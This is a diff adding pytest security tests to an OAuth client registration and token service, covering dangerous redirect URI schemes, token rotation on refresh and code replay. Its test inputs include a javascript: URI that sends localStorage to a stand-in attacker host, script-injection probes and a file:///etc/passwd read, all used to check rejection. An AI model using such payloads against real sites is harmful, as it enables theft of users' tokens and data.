@@ -362,3 +362,57 @@ def test_registration_refuses_oversized_metadata(c):
 
     assert r.status_code == 400
     assert r.json()["error"] == "invalid_client_metadata"
+
+
+# ------------------------------------------------------------- hardening ----
+
+
+@pytest.mark.parametrize(
+    "uri",
+    [
+        "javascript:fetch('//evil.example/'+btoa(localStorage))//",
+        "data:text/html,<script>alert(1)</script>",
+        "vbscript:msgbox(1)",
+        "file:///etc/passwd",
+    ],
+)
+def test_registration_refuses_a_redirect_that_would_run_in_the_page(c, uri):
+    r = c.post(
+        "/register",
+        json={
+            "client_name": "Claude",
+            "redirect_uris": [uri],
+            "token_endpoint_auth_method": "none",
+        },
+    )
+
+    assert r.status_code == 400
+    assert r.json()["error"] == "invalid_redirect_uri"
+
+
+def test_an_answer_never_sends_the_browser_to_a_script(c, db):
+    request_id = _authorize(c, _register(c), _pkce()[1])
+    row = next(r for r in db.rows("mcp_authorizations") if r["id"] == request_id)
+    row["params"]["redirect_uri"] = "javascript:alert(1)//"  # stored before the check existed
+
+    assert _answer(c, request_id, False).status_code == 400
+    assert _answer(c, request_id, True).status_code == 400
+
+
+def test_a_refresh_ends_the_old_access_token(c):
+    client_id, tokens = _connect(c)
+
+    fresh = _refresh(c, client_id, tokens["refresh_token"]).json()
+
+    assert _tools(c, tokens["access_token"]).status_code == 401
+    assert _tools(c, fresh["access_token"]).status_code == 200
+
+
+def test_replaying_a_code_ends_the_grant_it_made(c):
+    client_id = _register(c)
+    verifier, challenge = _pkce()
+    code = _code_from(_answer(c, _authorize(c, client_id, challenge), True).json()["redirect_url"])
+    first = _token(c, client_id, code, verifier).json()
+
+    assert _token(c, client_id, code, verifier).status_code == 400
+    assert _tools(c, first["access_token"]).status_code == 401
